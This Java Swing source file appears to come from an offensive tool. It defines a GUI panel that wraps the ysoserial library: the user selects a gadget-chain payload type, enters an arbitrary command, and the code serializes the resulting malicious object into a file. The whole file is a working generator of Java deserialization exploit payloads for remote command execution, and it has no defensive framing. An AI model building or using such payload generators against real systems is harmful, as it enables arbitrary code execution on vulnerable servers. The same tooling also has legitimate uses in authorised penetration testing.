package org.zof.deswing.ui;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import org.zof.deswing.model.PayloadTableModel;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.util.Vector;

public class PayloadPanel {
    private JTable table;
    private JPanel panel;
    private JTextField commandField;
    private JButton exportBtn;
    private PayloadTableModel tableModel;
    private static final File currentDir = new File("./");

    public PayloadPanel() {
        tableModel = new PayloadTableModel();
        table.setModel(tableModel);
        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        exportBtn.addActionListener(e -> {
            int selectedRow = table.getSelectedRow();
            if (selectedRow == -1) {
                JOptionPane.showMessageDialog(panel, "Please select a payload");
                return;
            }
            if (commandField.getText().isEmpty()) {
                JOptionPane.showMessageDialog(panel, "Please enter a command");
                return;
            }
            String payloadType = tableModel.getPayloadType(table.getSelectedRow());
            JFileChooser chooser = new JFileChooser();
            chooser.setCurrentDirectory(currentDir);
            chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
            chooser.showSaveDialog(null);
            File file = chooser.getSelectedFile();
            if (file == null) {
                JOptionPane.showMessageDialog(panel, "Please select a file");
                return;
            }
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
            try {
                final ObjectPayload payload = payloadClass.newInstance();
                final Object object = payload.getObject(commandField.getText());
                FileOutputStream fos = new FileOutputStream(file);
                Serializer.serialize(object, fos);
                ObjectPayload.Utils.releasePayload(payload, object);
                JOptionPane.showMessageDialog(null, "success");
                fos.close();
            } catch (Exception ex) {
                JOptionPane.showMessageDialog(panel, ex.getMessage());
            }
        });
    }

}
